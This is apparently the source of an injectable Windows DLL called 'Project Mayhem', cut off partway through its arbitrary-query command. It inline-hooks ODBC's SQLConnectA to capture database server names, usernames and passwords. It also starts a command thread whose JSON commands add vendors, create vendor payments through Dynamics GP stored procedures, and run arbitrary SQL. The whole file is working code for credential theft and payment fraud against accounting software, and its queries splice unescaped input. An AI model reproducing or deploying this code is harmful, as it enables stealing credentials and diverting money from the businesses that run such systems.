/*
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 * * Redistributions of source code must retain the above copyright
 *   notice, this list of conditions and the following disclaimer.
 * * Redistributions in binary form must reproduce the above
 *   copyright notice, this list of conditions and the following disclaimer
 *   in the documentation and/or other materials provided with the
 *   distribution.
 * * Neither the name of the  nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <sqlext.h>
#pragma comment(lib, "odbc32.lib")

#include "mayhem.h"
#include "install_hook.h"
#include "utilities.h"

#include "cJSON\cJSON.h"

static SQLHENV hndlEnv = NULL;
static HANDLE main_thread = NULL;
static char query_buffer[0x1000];
Credentials creds;
extern HINSTANCE hAppInstance;

BYTE stub_sql_alloc_stmt[] = {
	0xba, 0x00, 0x00, 0x00, 0x00, /* mov edx, 0x00000000 */
	0x8b, 0x45, 0x04,             /* mov eax, [ebp+4] */
	0x89, 0x02,                   /* mov [edx], eax */
};

BYTE stub_sql_connect[] = {
	0x68, 0x00, 0x00, 0x00, 0x00,  /* push 0x00000000 ; &password */
	0x68, 0x00, 0x00, 0x00, 0x00,  /* push 0x00000000 ; &username */
	0x68, 0x00, 0x00, 0x00, 0x00,  /* push 0x00000000 ; &server */
	0x68, 0x00, 0x00, 0x00, 0x00,  /* push 0x00000000 ; buffer_sz */

	0x5b,                          /* pop ebx */
	0x59,                          /* pop ecx */
	0x8b, 0x55, 0x08,              /* mov edx, [ebp+0x08] ; &server */
	0x53,                          /* push ebx */
	0xe8, 0x16, 0x00, 0x00, 0x00,  /* call strncpy */

	0x59,                          /* pop ecx */
	0x8b, 0x55, 0x10,              /* mov edx, [ebp+0x10] ; &username */
	0x53,                          /* push ebx */
	0xe8, 0x0c, 0x00, 0x00, 0x00,  /* call strncpy */

	0x59,                          /* pop ecx */
	0x8b, 0x55, 0x18,              /* mov edx, [ebp+0x18] ; &password */
	0x53,                          /* push ebx */
	0xe8, 0x02, 0x00, 0x00, 0x00,  /* call strncpy */
	0xeb, 0x26,                    /* jmp end */

	/* label: strncpy(&dst, &src, sz)
	 * ecx: destination pointer
	 * edx: source pointer
	 * stack: size
	 *
	 * bytes copied are returned in eax
	 * preserved registers: ebx, ecx, edx, ebp
	 */
	0x55,                           /* push ebp */
	0x89, 0xe5,                     /* mov ebp, esp */
	0x89, 0xcf,                     /* mov edi, ecx */
	0x89, 0xd6,                     /* mov esi, edx */
	0x8b, 0x4d, 0x08,               /* mov ecx, [ebp+0x08] */
	0x31, 0xd2,                     /* xor edx, edx */
	/* label: startloop */
	0x39, 0xca,                     /* cmp edx, ecx */
	0x73, 0x0c,                     /* jnb endloop */
	0x0f, 0xb6, 0x04, 0x16,         /* movzx eax, byte [esi+edx] */
	0x88, 0x04, 0x17,               /* mov byte [edi+edx], al */
	0x42,                           /* inc edx */
	0x84, 0xc0,                     /* test al, al */
	0x75, 0xf0,                     /* jnz startloop */
	/* label: endloop */
	0x89, 0xd0,                     /* mov eax, edx */
	0x89, 0xf9,                     /* mov ecx, edi */
	0x89, 0xf2,                     /* mov edx, esi */
	0x5d,                           /* pop ebp */
	0xc2, 0x04, 0x00                /* ret 0x04 */
	/* label: end */
};

int patch_sql_connect_a(void) {
	DWORD arg_push_offset = 0;
	DWORD buffer_sz_a = 0x40;

	creds.server_a = (PCHAR)malloc(buffer_sz_a * 3);
	if (!creds.server_a) {
		creds.buffer_sz_a = 0;
		return 1;
	}
	memset(creds.server_a, '\0', buffer_sz_a * 3);
	creds.username_a = (PCHAR)((PBYTE)creds.server_a + buffer_sz_a);
	creds.password_a = (PCHAR)((PBYTE)creds.username_a + buffer_sz_a);
	creds.buffer_sz_a = buffer_sz_a;

	*(DWORD *)(stub_sql_connect + arg_push_offset + 16) = (DWORD)(buffer_sz_a - 1);
	*(DWORD *)(stub_sql_connect + arg_push_offset + 11) = (DWORD)creds.server_a;
	*(DWORD *)(stub_sql_connect + arg_push_offset + 6) = (DWORD)creds.username_a;
	*(DWORD *)(stub_sql_connect + arg_push_offset + 1) = (DWORD)creds.password_a;
	return local_install_inline_hook_by_name("odbc32.dll", "SQLConnectA", stub_sql_connect, sizeof(stub_sql_connect), NULL);
}

int patch_sql_alloc_stmt(void) {
	*(DWORD *)(stub_sql_alloc_stmt + 1) = (DWORD)&hndlEnv;
	return local_install_inline_hook_by_name("odbc32.dll", "SQLAllocStmt", stub_sql_alloc_stmt, sizeof(stub_sql_alloc_stmt), NULL);
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
	BOOL bReturnValue = TRUE;
	switch( dwReason )
	{
		case DLL_PROCESS_ATTACH:
			patch_sql_connect_a();
			if (patch_sql_alloc_stmt() == 0) {
#ifdef _DEBUG
				MessageBox(NULL, "Welcome To Project Mayhem", "Status", MB_OK);
#endif
				if (main_thread == NULL) {
					main_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&main_routine, NULL, 0, NULL);
				}
#ifdef _DEBUG
			} else {
				MessageBox(NULL, "Failed To Load Project Mayhem", "Error", MB_OK);
#endif
			}
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
	}
	return bReturnValue;
}

void allocate_bindings(HSTMT hStmt, SQLSMALLINT cCols, BINDING **ppBinding, SQLSMALLINT *pDisplay) {
	SQLSMALLINT iCol;
	BINDING *pThisBinding, *pLastBinding = NULL;
	SQLLEN cchDisplay, ssType;
	SQLSMALLINT cchColumnNameLength;

	*pDisplay = 0;
	for (iCol = 1; iCol <= cCols; iCol++) {
		pThisBinding = (BINDING *)(malloc(sizeof(BINDING)));
		if (pThisBinding == NULL) {
			break;
		}
		if (iCol == 1) {
			*ppBinding = pThisBinding;
		} else {
			pLastBinding->sNext = pThisBinding;
		}
		pLastBinding = pThisBinding;

		SQLColAttribute(hStmt, iCol, SQL_DESC_DISPLAY_SIZE, NULL, 0, NULL, &cchDisplay);
		SQLColAttribute(hStmt, iCol, SQL_DESC_CONCISE_TYPE, NULL, 0, NULL, &ssType);
		pThisBinding->fChar = (ssType == SQL_CHAR || ssType == SQL_VARCHAR || ssType == SQL_LONGVARCHAR);
		pThisBinding->sNext = NULL;

		/* arbitray limit on display size */
		if (cchDisplay > DISPLAY_MAX) {
			cchDisplay = DISPLAY_MAX;
		}
		pThisBinding->szBuffer = (CHAR *)malloc((cchDisplay+1) * sizeof(CHAR));

		if (!(pThisBinding->szBuffer)) {
			break;
		}
		SQLBindCol(hStmt, iCol, SQL_C_CHAR, (SQLPOINTER)pThisBinding->szBuffer, (cchDisplay + 1) * sizeof(CHAR), &pThisBinding->indPtr);
		SQLColAttribute(hStmt, iCol, SQL_DESC_NAME, NULL, 0, &cchColumnNameLength, NULL);
		pThisBinding->cDisplaySize = max((SQLSMALLINT)cchDisplay, cchColumnNameLength);
		if (pThisBinding->cDisplaySize < NULL_SIZE) {
			pThisBinding->cDisplaySize = NULL_SIZE;
		}
		*pDisplay += pThisBinding->cDisplaySize + DISPLAY_FORMAT_EXTRA;
	}
	return;
}

SQLRETURN execute_query(char *query, size_t query_sz) {
	SQLHSTMT hndlStatement = NULL;
	SQLRETURN ret_val = SQL_SUCCESS;

	ret_val = SQLAllocStmt(hndlEnv, &hndlStatement);
	if (SQLRETURN_IS_ERROR(ret_val)) {
		return ret_val;
	}

	if (strncmp(query, "BEGIN", 5) == 0) {
		SQLSetStmtOption(hndlStatement, SQL_QUERY_TIMEOUT, 0);
		SQLSetStmtOption(hndlStatement, SQL_ASYNC_ENABLE, SQL_ASYNC_ENABLE_OFF);
		SQLSetStmtOption(hndlStatement, SQL_NOSCAN, TRUE);
	} else {
		SQLSetStmtOption(hndlStatement, SQL_NOSCAN, FALSE);
	}
	ret_val = SQLExecDirect(hndlStatement, (SQLCHAR *)query, query_sz);
	SQLFetch(hndlStatement);
	SQLFreeStmt(hndlStatement, SQL_CLOSE);
	return ret_val;
}

SQLRETURN get_next_note_index(char *noteidx, size_t noteidx_sz) {
	SQLHSTMT hndlStatement = NULL;
	SQLLEN sqlnoteidx_sz = 0;
	SQLRETURN ret_val;

	ret_val = SQLAllocStmt(hndlEnv, &hndlStatement);
	if (SQLRETURN_IS_ERROR(ret_val)) {
		return ret_val;
	}
	SQLSetStmtOption(hndlStatement, SQL_QUERY_TIMEOUT, 0);
	SQLSetStmtOption(hndlStatement, SQL_NOSCAN, TRUE);
	SQLSetStmtOption(hndlStatement, SQL_ASYNC_ENABLE, FALSE);
	ret_val = SQLExecDirect(hndlStatement, (SQLCHAR *)"BEGIN DECLARE @stored_proc_name char(31) DECLARE @retstat int DECLARE @param3 numeric(19,5) DECLARE @param4 int set nocount on SELECT @stored_proc_name = 'DYNAMICS.dbo.smGetNextNoteIndex' EXEC @retstat = @stored_proc_name -1, 12, @param3 OUT, @param4 OUT SELECT @retstat, @param3, @param4 set nocount on END ", 0x134);
	SQLFetch(hndlStatement);
	SQLGetData(hndlStatement, 2, SQL_C_CHAR, noteidx, noteidx_sz, &sqlnoteidx_sz);
	SQLFreeStmt(hndlStatement, SQL_CLOSE);
	return ret_val;
}

DWORD command_add_vendor(cJSON *parameters, cJSON *result) {
	SQLHSTMT hndlStatement = NULL;
	SQLRETURN ret_val = SQL_SUCCESS;
	time_t now;
	struct tm local_now;
	char date_str[16];
	char short_name[16];
	char *vendor_id;
	char *name;
	char *address1;
	char *city;
	char *state;
	char *zipcode;
	char noteidx[16];
	size_t query_cursor = 0;

	vendor_id = cJSON_GetObjectItem(parameters, "vendor_id")->valuestring;
	name = cJSON_GetObjectItem(parameters, "name")->valuestring;
	address1 = cJSON_GetObjectItem(parameters, "addr1")->valuestring;
	city = cJSON_GetObjectItem(parameters, "city")->valuestring;
	state = cJSON_GetObjectItem(parameters, "state")->valuestring;
	zipcode = cJSON_GetObjectItem(parameters, "zipcode")->valuestring;

	memset(short_name, '\0', sizeof(short_name));
	strncpy_s(short_name, sizeof(short_name), name, _TRUNCATE);

	time(&now);
	local_now = *localtime(&now);
	strftime(date_str, sizeof(date_str), "%Y.%m.%d", &local_now);

	if (hndlEnv == NULL) {
		return ERROR_NO_HANDLE;
	}

	if SQLRETURN_IS_ERROR(get_next_note_index(noteidx, sizeof(noteidx))) {
		return __LINE__;
	}

	ret_val = execute_query("{ CALL DYNAMICS.dbo.zDP_SY05400SS_1 ( 0 ) } ", 0x2c);
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM00200SI '%s', '%s', '%s', '%s', ", vendor_id, name, name, short_name);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'PRIMARY ADDRESS', 'PRIMARY ADDRESS', 'PRIMARY ADDRESS', 'PRIMARY ADDRESS', '', '', ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'%s', '', '', '%s', '%s', '%s', '', '', '', '', '', '', '', '', '', ", address1, city, state, zipcode);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'', 1, '', '', '', 0, 1, 0, 0.00000, '', 0, 0, 0.00000, 0, 0.00000, '', '', '', '', ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, '', 1, 1, 1, 1, 0, 0, 1, 1, 0.00000, 0, 0, '', '1900.01.01', '1900.01.01', ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, %s, '', '%s', '%s', ", noteidx, date_str, date_str);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'', 1, 0, 1, '', '', 0, 0, '', 0, 0, 0, 0, 0, 0, '1900.01.01', 0, '', '', 0, 0, 0, @num OUT SELECT @num END ");

	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}
	return ERROR_SUCCESS;
}

DWORD command_pay_vendor(cJSON *parameters, cJSON *result) {
	SQLHSTMT hndlStatement = NULL;
	SQLRETURN ret_val = SQL_SUCCESS;
	char *vendor_id;
	char *amount;
	char *checkbook;
	char payment_id[32];
	char noteidx[16];
	char nextchknum[24];
	SQLLEN payment_id_sz = 0;
	SQLLEN nextchknum_sz = 0;
	SQLLEN journal_num_sz = 0;
	size_t query_cursor = 0;

	vendor_id = cJSON_GetObjectItem(parameters, "vendor_id")->valuestring;
	amount = cJSON_GetObjectItem(parameters, "amount")->valuestring;
	checkbook = cJSON_GetObjectItem(parameters, "checkbook")->valuestring;

	if (SQLRETURN_IS_ERROR(SQLAllocStmt(hndlEnv, &hndlStatement))) {
		return __LINE__;
	}
	SQLSetStmtOption(hndlStatement, SQL_QUERY_TIMEOUT, 0);
	SQLSetStmtOption(hndlStatement, SQL_NOSCAN, TRUE);
	SQLSetStmtOption(hndlStatement, SQL_ASYNC_ENABLE, FALSE);
	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "SELECT TOP 25 NXTCHNUM FROM TWO.dbo.CM00100 WITH ( NOLOCK ) WHERE CHEKBKID = '%s' ORDER BY CHEKBKID ASC ", checkbook);
	ret_val = SQLExecDirect(hndlStatement, (SQLCHAR *)query_buffer, strlen(query_buffer));
	SQLFetch(hndlStatement);
	SQLGetData(hndlStatement, 1, SQL_C_CHAR, nextchknum, sizeof(nextchknum), &nextchknum_sz);
	SQLFreeStmt(hndlStatement, SQL_CLOSE);
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	if (SQLRETURN_IS_ERROR(SQLAllocStmt(hndlEnv, &hndlStatement))) {
		return __LINE__;
	}
	SQLSetStmtOption(hndlStatement, SQL_QUERY_TIMEOUT, 0);
	SQLSetStmtOption(hndlStatement, SQL_NOSCAN, TRUE);
	SQLSetStmtOption(hndlStatement, SQL_ASYNC_ENABLE, FALSE);
	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @stored_proc_name char(31) DECLARE @retstat int DECLARE @param1 char(21) ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "DECLARE @param15 smallint DECLARE @param16 int set nocount on SELECT @param1 = '' ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "SELECT @param15 = 4 SELECT @param16 = 0 SELECT @stored_proc_name = 'TWO.dbo.pmControlNumberValidate' ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "EXEC @retstat = @stored_proc_name @param1 OUT, 1, 0, 0, '', '', '', '', '1900.01.01', '1900.01.01', ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'', '1900.01.01', '', 0, @param15 OUT, @param16 OUT SELECT @retstat, @param1, @param15, @param16 set nocount on END");
	ret_val = SQLExecDirect(hndlStatement, (SQLCHAR *)query_buffer, strlen(query_buffer));
	SQLFetch(hndlStatement);
	SQLGetData(hndlStatement, 2, SQL_C_CHAR, payment_id, sizeof(payment_id), &payment_id_sz);
	SQLFreeStmt(hndlStatement, SQL_CLOSE);
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{ CALL TWO.dbo.zDP_PM10100SS_2 ( '%s', 1, '', 2, 35 ) } ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{ CALL TWO.dbo.zDP_PM10100SS_2 ( '%s', 1, '', 1, 1 ) } ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM10100SI '%s', 16384, 1, %s, ", payment_id, amount);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 1, 1, 0, '', 0, '%s', '', '1900.01.01', 'TWO', 'Z-US$', 1007, ", vendor_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 0.00000, '', 0, 0, '', '', '', 1.0000000, '1900.01.01', '00:00:00', ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0, 2, '1900.01.01', 'Z-US$', 1007, 0.0000000, 0, '', @num OUT SELECT @num END ");
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{ CALL TWO.dbo.zDP_PM10100SS_2 ( '%s', 1, '', 2, 35 ) } ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM10100SI '%s', 32768, 1, 0.00000, %s, ", payment_id, amount);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "35, 2, 0, '', 0, '%s', '', '1900.01.01', 'TWO', 'Z-US$', 1007, ", vendor_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 0.00000, '', 0, 0, '', '', '', 1.0000000, '1900.01.01', '00:00:00', ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0, 2, '1900.01.01', 'Z-US$', 1007, 0.0000000, 0, '', @num OUT SELECT @num END ");
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM10400SI 'sa', 'XXPM_Payment', '%s', '%s', ", payment_id, vendor_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'%s', 6, %s, '2017.04.12', '2017.04.12', 0, %s, '', 'Z-US$', '%s', '', ", nextchknum, amount, amount, checkbook);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 0.00000, 0.00000, %s, 0.00000, 0x00000000, 0x00000000, 0x00000000, 0.00000, ", amount);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 0, 0, 313.00000, '%s', 1, '2013.08.21', 'sa', '1900.01.01', '', 0.00000, 0, @num OUT SELECT @num END ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{ CALL TWO.dbo.zDP_PM00400SS_1 ( 1, '%s' ) } ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{ CALL TWO.dbo.zDP_PM10400SS_1 ( 'XXPM_Payment', 'sa', '%s' ) } ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{ CALL TWO.dbo.zDP_PM00400SS_1 ( 1, '%s' ) } ", payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM80600SI '%s', 16384, 1, %s, 0.00000, 0.00000, ", payment_id, amount);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 1, 1, '', '%s', 'PMPAY00000026', '2013.08.21', 6, '2017.04.12', '', 0, '', 'Z-US$', 1007, 'TWO', 0, 'Z-US$', 1007, @num OUT SELECT @num END ", vendor_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM80600SI '%s', 32768, 1, 0.00000, 0.00000, ", payment_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "%s, 0.00000, 35, 2, '', '%s', 'PMPAY00000026', '2013.08.21', 6, '2017.04.12', '', 0, '', 'Z-US$', 1007, 'TWO', 0, 'Z-US$', 1007, @num OUT SELECT @num END ", amount, vendor_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	if SQLRETURN_IS_ERROR(get_next_note_index(noteidx, sizeof(noteidx))) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_PM20000SI '%s', '%s', 6, '2017.04.12', ", payment_id, vendor_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'%s', %s, %s, 0.00000, 0.00000, 0.00000, 'sa', 'PMPAY00000026', 'XXPM_Payment', ", nextchknum, amount, amount);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'1900.01.01', '1900.01.01', '', 0.00000, 0.00000, 0.00000, '', 0.00000, 0.00000, ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 0.00000, 0, 0, '%s', '1900.01.01', 0.00000, 0, 0, 0.00000, '2013.09.04', ", checkbook);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'sa', '2017.04.12', 'sa', 0, '', 0.00000, 0.00000, 0.00000, 0.00000, 0.00000, ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 'Z-US$', '', '', '', '', '', '', '2017.04.12', 0.00000, 1, %s, 0, 0.00000, ", noteidx);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0, '1900.01.01', '1900.01.01', 0, 0, 0.00000, 0, 0, 0, 0, 0, '', 0.00000, 0, '', 0, 0, @num OUT SELECT @num END ");
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "BEGIN DECLARE @num int EXEC TWO.dbo.zDP_ICJC9001SI 'sa', 'XXPM_Payment', '%s', ",payment_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'%s', '%s', 6, '', %s, '2017.04.12', '2017.04.12', '', '', '', '1900.01.01', ", vendor_id, nextchknum, amount);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, '1900.01.01', 0.00000, 0.00000, 0.00000, '', '', '1900.01.01', '', 0.00000, ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'', '1900.01.01', '', 0.00000, '', '', '', '', '1900.01.01', 'Z-US$', '%s', '', ", checkbook);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, 0.00000, 0.00000, 0.00000, 0.00000, 0.00000, '', '', 0.00000, 0.00000, 0.00000, ");
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0.00000, %s, 0, 0x00000000, 0x00000000, 0.00000, 0, 0.00000, 0, 0, 0.00000, '%s', 1, ", amount, payment_id);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "'2017.04.12', 'sa', '2013.09.04', 'sa', %s, 0.00000, 0.00000, 0.00000, '', '', '', 0, ", noteidx);
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "0, 0.00000, @num OUT SELECT @num END");
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	memset(query_buffer, '\0', sizeof(query_buffer));
	query_cursor = 0;
	query_cursor += sprintf_s(query_buffer + query_cursor, sizeof(query_buffer) - query_cursor, "{CALL TWO.dbo.zDP_ICJC2006F_5('%s',-2147483648,'%s',2147483647)}", payment_id, payment_id);
	ret_val = execute_query(query_buffer, strlen(query_buffer));
	if SQLRETURN_IS_ERROR(ret_val) {
		return __LINE__;
	}

	return ERROR_SUCCESS;
}

DWORD command_exec_query(cJSON *parameters, cJSON *result) {
	SQLHSTMT hndlStatement = NULL;
	SQLLEN sql_sz = 0;
	SQLRETURN ret_val;
	BINDING *pFirstBind, *pThisBind;
	SQLSMALLINT cDisplaySize;
	SQLSMALLINT cCols;
	SQLSMALLINT iCol;
	char column_name[64];
	char *sql_query;
	BOOL fNoData = FALSE;
	cJSON *res_names = cJSON_CreateArray();
	cJSON *res_values = cJSON_CreateArray();
	cJSON *row = NULL;

	sql_query = cJSON_GetObjectItem(parameters, "query")->valuestring;

	ret_val = SQLAllocStmt(hndlEnv, &hndlStatement);
	if (SQLRETURN_IS_ERROR(ret_val)) {
		return __LINE__;
	}
	SQLSetStmtOption(hndlStatement, SQL_NOSCAN, FALSE);
	ret_val = SQLExecDirect(hndlStatement, (SQLCHAR *)sql_query, strlen(sql_query));
	if (SQLRETURN_IS_ERROR(ret_val)) {
		SQLFreeStmt(hndlStatement, SQL_CLOSE);
		return __LINE__;
	}
	SQLNumResultCols(hndlStatement, &cCols);
	allocate_bindings(hndlStatement, cCols, &pFirstBind, &cDisplaySize);

	/* get the column names */
	iCol = 1;
	for (pThisBind = pFirstBind; pThisBind; pThisBind = pThisBind->sNext) {
		SQLColAttribute(hndlStatement, iCol++, SQL_DESC_NAME, column_name, sizeof(column_name), NULL, NULL);
		cJSON_AddItemToArray(res_names, cJSON_CreateString(column_name));
	}

	/* get the column values */
	do {
		if (SQLFetch(hndlStatement) == SQL_NO_DATA_FOUND) {
			fNoData = TRUE;
			continue;
		}
		row = cJSON_CreateArray();
		for (pThisBind = pFirstBind; pThisBind; pThisBind = pThisBind->sNext) {
			if (pThisBind->indPtr == SQL_NULL_DATA) {
				cJSON_AddItemToArray(row, cJSON_CreateNull());
			} else {
